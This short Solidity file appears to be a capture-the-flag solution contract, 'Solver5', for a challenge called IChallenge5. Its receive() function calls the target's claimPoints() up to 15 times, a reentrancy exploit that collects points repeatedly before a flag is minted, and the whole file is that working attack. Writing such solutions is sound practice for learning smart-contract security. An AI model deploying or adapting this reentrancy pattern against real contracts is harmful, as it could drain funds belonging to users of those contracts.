// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./IChallenge5.sol";

contract Solver5 {
    IChallenge5 public challenge;
    uint256 public count;

    constructor(address _challenge) {
        challenge = IChallenge5(_challenge);
    }

    function solve() external {
        challenge.claimPoints();
        challenge.mintFlag();
    }

    receive() external payable {
        if (count < 15) { // Needs 10, go a bit higher to be safe
            count++;
            challenge.claimPoints();
        }
    }
}
